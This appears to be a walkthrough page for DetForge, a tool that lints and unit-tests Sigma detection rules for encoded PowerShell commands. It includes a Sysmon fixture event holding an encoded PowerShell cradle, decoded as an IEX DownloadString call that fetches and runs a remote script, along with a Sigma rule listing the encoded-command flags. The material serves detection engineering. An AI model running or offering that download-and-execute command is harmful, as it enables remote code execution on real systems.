STOP 01

The attack

A user opens a document. A moment later, Sysmon writes this. One process-creation event among thousands that hour.

Sysmon event 1 · process creation from the test fixtures
Image
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentImage
C:\Windows\System32\cmd.exe
User
CORP\jdoe
CommandLine
powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxACIAKQA=
IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")

Downloads a script from another machine and runs it in memory. Nothing is written to disk. The -e is the short form of -EncodedCommand; the base64 is UTF-16, which is why it looks like that.

Why attackers do this: an encoded command hides what is being run from anyone glancing at a process list, and it avoids quoting problems in one-liners. It is MITRE ATT&CK T1059.001.

STOP 02

The rule

An analyst writes it in Sigma, the vendor-neutral format for detections. Click a part to see what it is for.

rules/windows/execution/powershell_encoded_command.yml
title: PowerShell Encoded Command Execution tags: [attack.execution, attack.t1059.001] logsource: { product: windows, category: process_creation } detection: selection_img: - Image|endswith: ['\powershell.exe', '\pwsh.exe'] - OriginalFileName: ['PowerShell.EXE', 'pwsh.dll'] selection_cli: CommandLine|windash|contains: - ' -e ' - ' -ec ' - ' -enc ' # ... every abbreviation up to ' -encodedcommand ' condition: all of selection_* level: high
Click selection_img, selection_cli or the condition.

STOP 03

The question nobody asks

The rule gets pasted into the SIEM and forgotten. Here are three quiet ways it dies. None of them throws an error. The dashboard stays green. Click one.

Someone tidies the quotes

A well-meaning edit removes the spaces around the flags.

- ' -enc '
+ '-enc'
-enc is now also inside -Encoding. Every Out-File -Encoding utf8 in the company pages the on-call. By Friday the rule is disabled.

PowerShell 7 arrives

The first version of the rule only knew powershell.exe.

Developers install PowerShell 7. Its binary is pwsh.exe. The attacker uses it too. The rule never fires again, and nobody notices, because a rule that never fires looks exactly like a rule that is working.

The agent renames a field

A logging upgrade changes CommandLine to process.command_line.

The query still runs. It matches nothing, forever. There is no error to catch, only an absence.

This is the gap DetForge fills. Code has unit tests that fail loudly when behaviour changes. Detection rules usually do not. So give them some.

STOP 04

Lint: is the rule even well formed?

Before anything runs against events, detforge lint checks the file the way a code linter would. These are the real check names.

detforge lint --offline not run
  • ·filenamesnake_case, ends in .yml, lives in rules/windows/<tactic>/
  • ·layoutthe folder name matches one of the rule's tactic tags
  • ·required-fieldtitle, id, status, description, author, date, logsource, detection, falsepositives, level, tags
  • ·tagsat least one ATT&CK technique tag and one tactic tag
  • ·fixturestp.jsonl and tn.jsonl exist for the rule's id, with at least 2 events each
  • ·pySigmathe standard Sigma validators (and the MITRE tag validators when online)

STOP 05

The rule lab: change the rule, watch the tests

This is detforge test, running in your browser on the repository's real fixture events. Every rule ships with events it must match, near-miss events it must not match, and a shared baseline of normal activity that no rule may match. Pick a version of the rule.

The near misses are the point. -ExecutionPolicy starts with -E. -Encoding starts with -Enco. Random noise would never catch those. Someone who knows the attack wrote those test events on purpose, and now every future edit is checked against them.

STOP 07

What do we actually cover?

detforge coverage reads the ATT&CK tags on every rule and draws the map. Lit cells are covered techniques. Click one.

ATT&CK Enterprise · 2 rules cover 3 techniques across 2 tactics
Two rules is a small start. The point is that the map is generated, so it is never out of date.

It also writes dist/attack-layer.json, a layer you can load straight into the ATT&CK Navigator, and dist/coverage.md for the report.

STOP 08

The build gate

All of this runs in GitHub Actions on every push and pull request. A rule that misses its attack or matches normal traffic cannot be merged. Try it.

That is the whole idea. The reviewer does not need to know the rule by heart. The failing event is right there in the job summary, by the description its author gave it.

Run it

Five commands, then CI does it for you.

Quickstart

git clone https://github.com/RedaKarrach/detforge.git
cd detforge
python -m venv .venv
.venv\Scripts\activate    # Linux/macOS: source .venv/bin/activate
pip install -e ".[dev]"

detforge lint --offline
detforge test
detforge convert --target all
detforge coverage
detforge report

On your own rules

# pyproject.toml
[tool.detforge]
rules = "sigma/rules"
fixtures = "sigma/tests"
out = "build"

Writing a rule

  • Put it in rules/windows/<tactic>/<rule_name>.yml, with a technique tag and a tactic tag.
  • Add tests/fixtures/<rule id>/tp.jsonl and tn.jsonl: one JSON event per line, at least two each. Make the TN events near misses, not noise.
  • Add a row to docs/RULES.md: what it looks for, what legitimately trips it, how an attacker gets around it. If you cannot write the last column, the rule is not finished.
  • Run detforge lint --offline and detforge test.

What it does not do

  • The fixtures prove the logic, not that your Sysmon config writes those exact field names. Export real events from a lab VM when you can.
  • Single-event rules only. Correlation rules are out of scope.
  • SQLite tests the rule's own field names. Review the converted Splunk and Elastic queries in the SIEM.
